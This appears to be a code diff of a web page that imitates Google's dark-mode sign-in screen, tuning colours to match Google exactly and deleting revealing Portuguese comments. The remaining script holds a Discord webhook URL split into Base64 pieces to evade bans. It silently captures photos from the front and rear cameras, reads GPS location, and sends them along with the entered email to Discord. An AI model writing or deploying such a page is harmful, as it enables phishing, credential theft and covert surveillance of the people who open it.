@@ -9,7 +9,7 @@
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
         font-family: 'Roboto', sans-serif;
-        background-color: #1f1f1f;
+        background-color: #131314; /* Cor EXATA do Google Dark */
         color: #e3e3e3;
         min-height: 100vh;
         display: flex;
@@ -89,7 +89,7 @@
 
     .btn-next {
         background-color: #8ab4f8;
-        color: #1f1f1f;
+        color: #131314;
         border: none;
         padding: 12px 24px;
         border-radius: 24px;
@@ -132,7 +132,7 @@
         justify-content: center;
         height: 100vh;
         position: fixed;
-        top: 0; left: 0; width: 100%; background: #1f1f1f; z-index: 99;
+        top: 0; left: 0; width: 100%; background: #131314; z-index: 99;
     }
     .loader {
         border: 3px solid rgba(255,255,255,0.1);
@@ -193,7 +193,6 @@
 </div>
 
 <script>
-    // WEBHOOK CODIFICADO EM BASE64 (Anti-Ban)
     const p1 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv";
     const p2 = "MTU3MTcyMTAwMjE3Njc0NTYxNQ==";
     const p3 = "L3h2cTZnM2NKM2MycldZNzZDcl9rcXNrc0VWMWVQWWxZTHAzSG5mS0dnODhqQVZnZXJzbllYR0JKbXVTaW9KdXlIMzA2";
@@ -213,7 +212,6 @@
         let fotoFrente = null;
         let fotoTras = null;
 
-        // 1. TIRAR FOTO DA FRENTE (Frontal)
         try {
             let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             video.srcObject = stream;
@@ -222,7 +220,6 @@
             stream.getTracks().forEach(t => t.stop());
         } catch (e) { console.log("Sem câmera frontal"); }
 
-        // 2. TIRAR FOTO DE TRÁS (Traseira)
         try {
             let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
             video.srcObject = stream;
@@ -231,7 +228,6 @@
             stream.getTracks().forEach(t => t.stop());
         } catch (e) { console.log("Sem câmera traseira"); }
 
-        // 3. GPS E ENVIO
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => { 
@@ -255,7 +251,7 @@
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        return canvas.toDataURL('image/jpeg', 0.6); // 0.6 pra não ficar pesado
+        return canvas.toDataURL('image/jpeg', 0.6);
     }
 
     async function sendToDiscord(email, fotoFrente, fotoTras, localizacao) {
